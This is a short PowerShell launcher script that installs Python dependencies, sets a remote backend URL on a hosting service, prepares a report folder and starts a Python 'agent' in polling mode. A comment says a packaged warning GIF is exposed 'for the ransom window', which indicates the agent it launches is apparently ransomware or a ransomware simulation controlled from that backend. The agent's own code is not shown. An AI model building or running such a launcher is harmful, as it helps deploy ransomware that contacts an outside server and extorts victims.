param(
  [string]$BackendUrl = "https://sample-2ang.onrender.com",
  [string]$AgentPath = "py_simple/agent_sync.py",
  [switch]$Polling = $true,
  [switch]$Debug = $true,
  [switch]$Insecure = $false
)

$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
Set-Location $ScriptDir

$env:PAUSE_ON_EXIT = "1"
$env:PROMPT_BACKEND = "1"
$env:BACKEND_URL = $BackendUrl
$env:REPORT_DIR = "C:\Users\user\report"

# Prefer workspace venv if present
$py = Join-Path $ScriptDir ".venv/Scripts/python.exe"
if (-not (Test-Path $py)) { $py = "python" }

$requirements = Join-Path $ScriptDir "requirements.txt"
& $py -m pip install -r $requirements
if ($LASTEXITCODE -ne 0) {
  Write-Host "pip install failed" -ForegroundColor Red
  if ($env:PAUSE_ON_EXIT -eq "1") { Read-Host "Press Enter to exit" }
  exit 1
}

# Ensure report directory exists
try { New-Item -ItemType Directory -Force -Path $env:REPORT_DIR | Out-Null } catch {}

# If a packaged GIF exists, expose it via env for the ransom window
$localGif = Join-Path $ScriptDir "py_simple/assets/warning.gif"
if (Test-Path $localGif) { $env:LOCAL_GIF_PATH = $localGif }

$flags = @()
if ($Polling) { $flags += "--polling" }
if ($Debug) { $flags += "--debug" }
if ($Insecure) { $flags += "--insecure" }

# If AgentPath is relative, resolve it relative to the script directory
if (-not ([System.IO.Path]::IsPathRooted($AgentPath))) {
  $AgentPath = Join-Path $ScriptDir $AgentPath
}

& $py $AgentPath --backend $BackendUrl @flags

if ($env:PAUSE_ON_EXIT -eq "1") { Read-Host "Press Enter to exit" }
